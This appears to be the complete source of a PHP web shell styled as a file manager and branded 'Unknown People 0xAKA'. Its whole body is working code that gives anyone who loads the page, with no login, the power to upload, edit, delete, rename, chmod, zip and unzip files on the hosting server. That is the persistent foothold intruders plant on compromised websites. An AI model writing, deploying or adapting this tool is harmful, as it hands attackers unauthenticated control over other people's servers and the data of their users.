<?php

$baseDir = realpath(__DIR__);

// Get current path from POST, fallback to root
$path = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['currentpath'])) {
    $path = trim($_POST['currentpath'], "/\\");
}

$currentDir = realpath($baseDir . DIRECTORY_SEPARATOR . $path);
// Security: restrict path inside baseDir
if ($currentDir === false || strpos($currentDir, $baseDir) !== 0) {
    $currentDir = $baseDir;
    $path = '';
}

function permsToString($perms) {
    $info = ($perms & 0xF000);
    if ($info === 0xC000) return 's'; // socket
    elseif ($info === 0xA000) return 'l'; // symbolic link
    elseif ($info === 0x8000) return '-'; // regular
    elseif ($info === 0x6000) return 'b'; // block special
    elseif ($info === 0x4000) return 'd'; // directory
    elseif ($info === 0x2000) return 'c'; // character special
    elseif ($info === 0x1000) return 'p'; // FIFO pipe
    else return 'u'; // unknown
}

function readablePerms($perms) {
    $info = permsToString($perms);
    $owner = (($perms & 0x0100) ? 'r' : '-').
             (($perms & 0x0080) ? 'w' : '-').
             (($perms & 0x0040) ?
                (($perms & 0x0800) ? 's' : 'x') :
                (($perms & 0x0800) ? 'S' : '-'));
    $group = (($perms & 0x0020) ? 'r' : '-').
             (($perms & 0x0010) ? 'w' : '-').
             (($perms & 0x0008) ?
                (($perms & 0x0400) ? 's' : 'x') :
                (($perms & 0x0400) ? 'S' : '-'));
    $world = (($perms & 0x0004) ? 'r' : '-').
             (($perms & 0x0002) ? 'w' : '-').
             (($perms & 0x0001) ?
                (($perms & 0x0200) ? 't' : 'x') :
                (($perms & 0x0200) ? 'T' : '-'));
    return $info . $owner . $group . $world;
}

function formatSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $size = $bytes;
    $unit = 0;
    while ($size >= 1024 && $unit < count($units)-1) {
        $size /= 1024;
        $unit++;
    }
    return round($size,2).' '.$units[$unit];
}

function isWritableStr($path) {
    return is_writable($path) ? 'Writable' : 'Not writable';
}

function safeHtml($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

function getOwner($path) {
    $ownerId = fileowner($path);
    if (function_exists('posix_getpwuid')) {
        $ownerData = posix_getpwuid($ownerId);
        return $ownerData['name'] ?? $ownerId;
    }
    return $ownerId;
}

function getSizeRecursive($path) {
    if (is_file($path)) return filesize($path);
    $size = 0;
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
    foreach ($files as $file) {
        if ($file->isFile()) $size += $file->getSize();
    }
    return $size;
}

// Process actions on POST
$message = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    $action = $_POST['action'];
    $item = $_POST['item'] ?? '';
    $itemPath = null;
    if ($item !== '') {
        $itemPathCandidate = realpath($currentDir . DIRECTORY_SEPARATOR . $item);
        if ($itemPathCandidate !== false && strpos($itemPathCandidate, $baseDir) === 0) {
            $itemPath = $itemPathCandidate;
        }
    }

    if ($action === 'upload' && isset($_FILES['uploadfile'])) {
        $uploadFile = $_FILES['uploadfile'];
        if ($uploadFile['error'] === UPLOAD_ERR_OK) {
            move_uploaded_file($uploadFile['tmp_name'], $currentDir . DIRECTORY_SEPARATOR . basename($uploadFile['name']));
            $message = "File uploaded successfully.";
        } else {
            $message = "File upload failed.";
        }
    } elseif ($action === 'mkdir' && !empty($_POST['foldername'])) {
        $newFolderName = basename(trim($_POST['foldername']));
        $newFolderPath = $currentDir . DIRECTORY_SEPARATOR . $newFolderName;
        if (!file_exists($newFolderPath)) {
            mkdir($newFolderPath);
            $message = "Folder created.";
        } else {
            $message = "Folder already exists.";
        }
    } elseif ($action === 'mkfile' && !empty($_POST['filename'])) {
        $newFileName = basename(trim($_POST['filename']));
        $newFilePath = $currentDir . DIRECTORY_SEPARATOR . $newFileName;
        if (!file_exists($newFilePath)) {
            file_put_contents($newFilePath, "");
            $message = "File created.";
        } else {
            $message = "File already exists.";
        }
    } elseif ($action === 'rename' && !empty($_POST['newname']) && $itemPath) {
        $newName = basename(trim($_POST['newname']));
        $newPath = dirname($itemPath) . DIRECTORY_SEPARATOR . $newName;
        if ($newPath !== $itemPath && !file_exists($newPath)) {
            rename($itemPath, $newPath);
            $message = "Renamed successfully.";
        } else {
            $message = "Rename failed.";
        }
    } elseif ($action === 'delete' && $itemPath) {
        function rrmdir($dir) {
            if (is_dir($dir)) {
                $objects = scandir($dir);
                foreach ($objects as $object) {
                    if ($object !== "." && $object !== "..") {
                        $objPath = $dir . DIRECTORY_SEPARATOR . $object;
                        if (is_dir($objPath)) rrmdir($objPath);
                        else unlink($objPath);
                    }
                }
                rmdir($dir);
            } else {
                unlink($dir);
            }
        }
        rrmdir($itemPath);
        $message = "Deleted.";
    } elseif ($action === 'chmod' && $itemPath && preg_match('/^[0-7]{3,4}$/', $_POST['chmodperm'] ?? '')) {
        $perm = intval($_POST['chmodperm'], 8);
        chmod($itemPath, $perm);
        $message = "Permissions changed.";
    } elseif ($action === 'savefile' && $itemPath && is_file($itemPath) && is_writable($itemPath)) {
        $content = $_POST['filecontent'] ?? '';
        file_put_contents($itemPath, $content);
        $message = "File saved.";
    } elseif ($action === 'zip' && $itemPath) {
        $zipName = basename($itemPath) . '.zip';
        $zipPath = $currentDir . DIRECTORY_SEPARATOR . $zipName;
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            if (is_file($itemPath)) {
                $zip->addFile($itemPath, basename($itemPath));
            } else if (is_dir($itemPath)) {
                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($itemPath), RecursiveIteratorIterator::LEAVES_ONLY);
                $baseLen = strlen($itemPath) + 1;
                foreach ($files as $file) {
                    if (!$file->isDir()) {
                        $filePath = $file->getRealPath();
                        $localPath = substr($filePath, $baseLen);
                        $zip->addFile($filePath, $localPath);
                    }
                }
            }
            $zip->close();
            $message = "Zipped to $zipName";
        } else {
            $message = "Zip failed.";
        }
    } elseif ($action === 'unzip' && $itemPath && is_file($itemPath) && strtolower(pathinfo($itemPath, PATHINFO_EXTENSION)) === 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($itemPath) === TRUE) {
            $extractedFolder = $currentDir . DIRECTORY_SEPARATOR . pathinfo($itemPath, PATHINFO_FILENAME);
            $zip->extractTo($extractedFolder);
            $zip->close();
            $message = "Unzipped to folder: " . basename($extractedFolder);
        } else {
            $message = "Unzip failed.";
        }
    }

    // Update $path if operation changed location (rename or delete a directory)
    // For safety, no redirection, just display message and current page with updated content
}

if (isset($_POST['navigatepath'])) {
    $navigatePath = trim($_POST['navigatepath'], "/\\");
    $navigateFull = realpath($baseDir . DIRECTORY_SEPARATOR . $navigatePath);
    if ($navigateFull !== false && strpos($navigateFull, $baseDir) === 0 && is_dir($navigateFull)) {
        $path = $navigatePath;
        $currentDir = $navigateFull;
    }
}

// For AJAX file content fetch
if (isset($_POST['ajaxaction']) && $_POST['ajaxaction'] === 'editfile' && isset($_POST['filename'])) {
    $fileName = $_POST['filename'];
    $filePath = realpath($currentDir . DIRECTORY_SEPARATOR . $fileName);
    if ($filePath && strpos($filePath, $baseDir) === 0 && is_file($filePath) && is_readable($filePath)) {
        header('Content-Type: application/json');
        echo json_encode(['content' => file_get_contents($filePath)]);
        exit;
    } else {
        header('HTTP/1.1 400 Bad Request');
        echo json_encode(['error' => 'Cannot read file']);
        exit;
    }
}

$items = scandir($currentDir);
usort($items, function($a, $b) use ($currentDir) {
    $aPath = $currentDir . DIRECTORY_SEPARATOR . $a;
    $bPath = $currentDir . DIRECTORY_SEPARATOR . $b;
    if (is_dir($aPath) && !is_dir($bPath)) return -1;
    if (!is_dir($aPath) && is_dir($bPath)) return 1;
    return strcasecmp($a, $b);
});
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Unknown People 0xAKA</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
body {
    margin: 0; padding: 0; background: #111;
    font-family: 'Orbitron', monospace, monospace;
    color: #0ff;
    -webkit-font-smoothing: antialiased;
}
a {
    color: #0ff;
    text-decoration: none;
}
a:hover {
    color: #ff0;
}
header {
    background: linear-gradient(45deg, #00fff7, #008b8b);
    padding: 1rem;
    text-align: center;
    font-size: 1.6rem;
    font-weight: bold;
    text-shadow: 0 0 6px #00fff7;
}
.container {
    max-width: 1200px;
    margin: 1rem auto;
    padding: 0 1rem;
}
.btn {
    background: #006666;
    border: none;
    color: #0ff;
    padding: 0.5rem 1rem;
    font-weight: bold;
    cursor: pointer;
    border-radius: 3px;
    text-shadow: 0 0 4px #0ff;
    margin-right: 0.3rem;
    transition: background 0.3s;
}
.btn:hover {
    background: #00ffff;
    color: #000;
}
input[type=text], input[type=file], select {
    border: none;
    border-bottom: 1px solid #0ff;
    background: transparent;
    color: #0ff;
    padding: 0.3rem 0.5rem;
    margin-right: 0.5rem;
    font-family: 'Orbitron', monospace;
    font-size: 1rem;
}
input[type=text]:focus, select:focus {
    outline: none;
    border-color: #0f0;
}
table {
    border-collapse: collapse;
    width: 100%;
    margin-top: 1rem;
}
th, td {
    border-bottom: 1px solid #004444;
    padding: 0.4rem 0.6rem;
    text-align: left;
    vertical-align: middle;
}
th {
    background: #004444;
    font-weight: 700;
}
tr:hover {
    background: #002222;
}
.file-icon {
    display: inline-block;
    width: 20px;
    text-align: center;
    margin-right: 0.5rem;
    color: #0ff;
}
.path-nav {
    margin: 0.5rem 0;
    font-size: 0.9rem;
}
.path-nav form {
    display: inline;
}
.path-nav button {
    color: #0ff;
    background: none;
    border: none;
    font-family: 'Orbitron', monospace;
    font-size: 1rem;
    cursor: pointer;
    padding: 0;
    margin-right: 0.3rem;
    text-shadow: 0 0 2px #0ff;
}
.path-nav button:hover {
    color: #ff0;
    text-decoration: underline;
}
.modal {
    position: fixed;
    z-index: 9999;
    left: 0; top: 0; width: 100%; height: 100%;
    background: rgba(0,255,255,0.15);
    display: none;
    overflow: auto;
    -webkit-backdrop-filter: blur(6px);
    backdrop-filter: blur(6px);
}
.modal-content {
    position: relative;
    background: #003333;
    margin: 10% auto;
    padding: 1rem;
    width: 90%;
    max-width: 800px;
    border-radius: 6px;
    box-shadow: 0 0 20px #00ffff;
    transition: max-height 0.4s ease;
}
.slide-down {
    animation: slideDownAnim 0.4s forwards;
}
.slide-up {
    animation: slideUpAnim 0.4s forwards;
}
@keyframes slideDownAnim {
    from { max-height: 0; opacity: 0;}
    to { max-height: 1000px; opacity: 1;}
}
@keyframes slideUpAnim {
    from { max-height: 1000px; opacity: 1;}
    to { max-height: 0; opacity: 0;}
}
.modal textarea {
    width: 100%;
    height: 400px;
    background: #001f1f;
    color: #0ff;
    border: none;
    resize: vertical;
    font-family: 'Orbitron', monospace;
    font-size: 14px;
    padding: 0.5rem;
    border-radius: 4px;
    box-shadow: inset 0 0 5px #00ffff;
}
.info {
    font-size: 0.85rem;
    color: #0ff;
    margin-top: 0.5rem;
}
.message {
    background: #002222;
    border: 1px solid #00ffff;
    padding: 0.6rem;
    margin-bottom: 1rem;
    border-radius: 4px;
    color: #0ff;
    text-align: center;
    text-shadow: 0 0 6px #0ff;
}
form.inline {
    display: inline-block;
    margin: 0;
}
.op-icon {
    font-family: monospace;
    font-weight: bold;
    padding: 0 0.3em;
    color: #0ff;
}
.op-icon:hover {
    color: #ff0;
    cursor: pointer;
}
input[readonly] {
    background: transparent;
    border: none;
    color: #0ff;
}
footer {
    text-align: center;
    font-size: 0.8rem;
    margin: 2rem 0;
    color: #006666;
}
</style>
</head>
<body>
<header>Unknown People 0xAKA</header>
<div class="container">
<?php if ($message): ?>
    <div class="message"><?=safeHtml($message)?></div>
<?php endif; ?>

<div class="path-nav" aria-label="Current path">
    Path:
    <form method="post" style="display:inline;">
        <input type="hidden" name="currentpath" value="" />
        <button type="submit">root</button>
    </form>
    <h3>Upload File</h3>
<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="action" value="upload" />
    <input type="hidden" name="currentpath" value="<?=safeHtml($path)?>" />
    <input type="file" name="uploadfile" required />
    <button type="submit" class="btn">Upload</button>
</form>

<h3>Create Folder</h3>
<form method="post">
    <input type="hidden" name="action" value="mkdir" />
    <input type="hidden" name="currentpath" value="<?=safeHtml($path)?>" />
    <input type="text" name="foldername" placeholder="Folder name" required autocomplete="off"/>
    <button type="submit" class="btn">Create</button>
</form>

<h3>Create Empty File</h3>
<form method="post">
    <input type="hidden" name="action" value="mkfile" />
    <input type="hidden" name="currentpath" value="<?=safeHtml($path)?>" />
    <input type="text" name="filename" placeholder="File name" required autocomplete="off"/>
    <button type="submit" class="btn">Create</button>
</form>
    <?php
    if ($path !== '') {
        $parts = explode('/', $path);
        $accPath = '';
        foreach ($parts as $i=>$part) {
            $accPath = $i === 0 ? $part : $accPath . '/' . $part;
            ?>
            <span> / </span>
            <form method="post" style="display:inline;">
                <input type="hidden" name="currentpath" value="<?=safeHtml($accPath)?>" />
                <button type="submit"><?=safeHtml($part)?></button>
            </form>
            <?php
        }
    }
    ?>
</div>

<h3>Current directory: <?=safeHtml($currentDir)?></h3>

<table>
<thead><tr>
<th>Name</th><th>Size</th><th>Writable</th><th>Permissions</th><th>Owner</th><th>Operations</th>
</tr></thead>
<tbody>
<?php if ($path !== ''): ?>
<tr>
    <td colspan="6">
        <form method="post" style="display:inline;">
            <input type="hidden" name="currentpath" value="<?=safeHtml(dirname($path))?>" />
            <button type="submit">.. (Parent Dir)</button>
        </form>
    </td>
</tr>
<?php endif; ?>
<?php foreach ($items as $item):
    if ($item === '.' || ($item === '..' && $path === '')) continue;
    $itemPath = $currentDir . DIRECTORY_SEPARATOR . $item;
    $isDir = is_dir($itemPath);
    $size = $isDir ? formatSize(getSizeRecursive($itemPath)) : formatSize(filesize($itemPath));
    $writable = isWritableStr($itemPath);
    $perms = readablePerms(fileperms($itemPath));
    $owner = getOwner($itemPath);
    $isFile = is_file($itemPath);
    $itemEncoded = safeHtml($item);
?>
<tr>
    <td>
        <span class="file-icon"><?= $isDir ? '📁' : '📄'?></span>
        <?php if ($isDir): ?>
            <form method="post" style="display:inline;">
                <input type="hidden" name="currentpath" value="<?=safeHtml(($path ? $path.'/' : '') . $item)?>" />
                <button type="submit" style="all: unset; cursor:pointer; color:#0ff; text-decoration:underline; font-family:inherit; font-size:inherit;"><?=safeHtml($item)?></button>
            </form>
        <?php else: ?>
            <?=$itemEncoded?>
        <?php endif; ?>
    </td>
    <td><?= $size ?></td>
    <td><?= $writable ?></td>
    <td><?= $perms ?></td>
    <td><?= safeHtml($owner) ?></td>
    <td>
        <form class="inline" method="post" style="display:inline-block" onsubmit="return confirm('Delete <?=addslashes($item)?>?');">
            <input type="hidden" name="action" value="delete" />
            <input type="hidden" name="item" value="<?=$itemEncoded?>" />
            <input type="hidden" name="currentpath" value="<?=safeHtml($path)?>" />
            <button type="submit" class="btn" title="Delete">&#x274C;</button>
        </form>
        <form class="inline" method="post" style="display:inline-block" onsubmit="return confirm('Zip <?=addslashes($item)?>?');">
            <input type="hidden" name="action" value="zip" />
            <input type="hidden" name="item" value="<?=$itemEncoded?>" />
            <input type="hidden" name="currentpath" value="<?=safeHtml($path)?>" />
            <button type="submit" class="btn" title="Zip">&#128190;</button>
        </form>

        <?php if ($isFile && strtolower(pathinfo($itemPath, PATHINFO_EXTENSION)) === 'zip'): ?>
        <form class="inline" method="post" style="display:inline-block" onsubmit="return confirm('Unzip <?=addslashes($item)?>?');">
            <input type="hidden" name="action" value="unzip" />
            <input type="hidden" name="item" value="<?=$itemEncoded?>" />
            <input type="hidden" name="currentpath" value="<?=safeHtml($path)?>" />
            <button type="submit" class="btn" title="Unzip">&#128228;</button>
        </form>
        <?php endif; ?>

        <button class="btn" title="Rename" onclick="showRenamePrompt('<?=addslashes($item)?>')">&#9998;</button>

        <button class="btn" title="Chmod" onclick="showChmodPrompt('<?=addslashes($item)?>', '<?= substr(sprintf('%o', fileperms($itemPath)), -4) ?>')">&#128274;</button>

        <?php if ($isFile && is_writable($itemPath)): ?>
        <button class="btn" title="Edit" onclick="editFile('<?=addslashes($item)?>')">&#9997;</button>
        <?php endif; ?>
    </td>
</tr>
<?php endforeach; ?>
</tbody>
</table>

<!-- Rename modal -->
<div id="renameModal" class="modal" aria-hidden="true">
    <div class="modal-content slide-down">
        <h3>Rename</h3>
        <form method="post" id="renameForm">
            <input type="hidden" name="action" value="rename" />
            <input type="hidden" name="item" id="renameItem" />
            <input type="hidden" name="currentpath" value="<?=safeHtml($path)?>" />
            <input type="text" name="newname" id="renameNewName" required placeholder="New name" autocomplete="off" />
            <div>
                <button type="submit" class="btn">Save</button>
                <button type="button" class="btn" onclick="closeRenameModal()">Cancel</button>
            </div>
        </form>
    </div>
</div>

<!-- Chmod modal -->
<div id="chmodModal" class="modal" aria-hidden="true">
    <div class="modal-content slide-down">
        <h3>Change Permissions (chmod)</h3>
        <form method="post" id="chmodForm">
            <input type="hidden" name="action" value="chmod" />
            <input type="hidden" name="item" id="chmodItem" />
            <input type="hidden" name="currentpath" value="<?=safeHtml($path)?>" />
            <input type="text" name="chmodperm" id="chmodPerm" placeholder="e.g. 0755" pattern="[0-7]{3,4}" required autocomplete="off"/>
            <div>
                <button type="submit" class="btn">Save</button>
                <button type="button" class="btn" onclick="closeChmodModal()">Cancel</button>
            </div>
        </form>
    </div>
</div>

<!-- Edit file modal -->
<div id="editModal" class="modal" aria-hidden="true">
    <div class="modal-content slide-down">
        <h3>Edit File: <span id="editFileName"></span></h3>
        <form method="post" id="editForm">
            <input type="hidden" name="action" value="savefile" />
            <input type="hidden" name="item" id="editItem" />
            <input type="hidden" name="currentpath" value="<?=safeHtml($path)?>" />
            <textarea name="filecontent" id="editFileContent" spellcheck="false"></textarea>
            <div style="margin-top: 0.5rem;">
                <button type="submit" class="btn">Save</button>
                <button type="button" class="btn" onclick="closeEditModal()">Cancel</button>
            </div>
        </form>
    </div>
</div>

</div>
<footer>Powered by Unknown People 0xAKA &copy; <?=date('Y')?></footer>
<script>
let renameModal = document.getElementById('renameModal');
let chmodModal = document.getElementById('chmodModal');
let editModal = document.getElementById('editModal');

function slideDown(element) {
    element.style.display = 'block';
    element.classList.remove('slide-up');
    element.classList.add('slide-down');
}
function slideUp(element, cb) {
    element.classList.remove('slide-down');
    element.classList.add('slide-up');
    setTimeout(() => {
        element.style.display = 'none';
        if(cb) cb();
    }, 400);
}

// Rename modal
function showRenamePrompt(item) {
    document.getElementById('renameItem').value = item;
    document.getElementById('renameNewName').value = item;
    slideDown(renameModal);
    renameModal.setAttribute('aria-hidden', 'false');
    document.getElementById('renameNewName').focus();
}
function closeRenameModal() {
    slideUp(renameModal);
    renameModal.setAttribute('aria-hidden', 'true');
}
document.getElementById('renameForm').addEventListener('submit', e => {
    if (!confirm('Rename ' + document.getElementById('renameItem').value + ' to ' + document.getElementById('renameNewName').value + '?')) {
        e.preventDefault();
        return false;
    }
});

// Chmod modal
function showChmodPrompt(item, perm) {
    document.getElementById('chmodItem').value = item;
    document.getElementById('chmodPerm').value = perm;
    slideDown(chmodModal);
    chmodModal.setAttribute('aria-hidden', 'false');
    document.getElementById('chmodPerm').focus();
}
function closeChmodModal() {
    slideUp(chmodModal);
    chmodModal.setAttribute('aria-hidden', 'true');
}
document.getElementById('chmodForm').addEventListener('submit', e => {
    let val = document.getElementById('chmodPerm').value;
    if (!/^[0-7]{3,4}$/.test(val)) {
        alert('Invalid permission format. Use 3 or 4 digit octal number (e.g. 0755)');
        e.preventDefault();
        return false;
    }
    if (!confirm('Change permissions of ' + document.getElementById('chmodItem').value + ' to ' + val + '?')) {
        e.preventDefault();
        return false;
    }
});

// Edit modal and ajax fetch file content
function editFile(filename) {
    const editFileNameElem = document.getElementById('editFileName');
    const editFileContentElem = document.getElementById('editFileContent');
    const editItemElem = document.getElementById('editItem');
    editFileNameElem.textContent = filename;
    editItemElem.value = filename;
    editFileContentElem.value = 'Loading ...';

    slideDown(editModal);
    editModal.setAttribute('aria-hidden', 'false');

    // Fetch file content via POST AJAX
    const formData = new FormData();
    formData.append('ajaxaction', 'editfile');
    formData.append('filename', filename);
    formData.append('currentpath', '<?=safeHtml($path)?>');

    fetch('', {
        method: 'POST',
        body: formData
    }).then(resp => {
        if (!resp.ok) throw new Error('Could not fetch file content.');
        return resp.json();
    })
    .then(data => {
        editFileContentElem.value = data.content;
        editFileContentElem.focus();
    }).catch(() => {
        editFileContentElem.value = 'Failed to load file content.';
    });
}
function closeEditModal() {
    slideUp(editModal);
    editModal.setAttribute('aria-hidden', 'true');
}

// Close modals on click outside modal content
window.onclick = function(event) {
    if (event.target === renameModal) closeRenameModal();
    else if (event.target === chmodModal) closeChmodModal();
    else if (event.target === editModal) closeEditModal();
};

// Keyboard: ESC to close modals
window.addEventListener('keydown', e => {
    if (e.key === 'Escape') {
        if (renameModal.style.display === 'block') closeRenameModal();
        if (chmodModal.style.display === 'block') closeChmodModal();
        if (editModal.style.display === 'block') closeEditModal();
    }
});
</script>
</body>
</html>
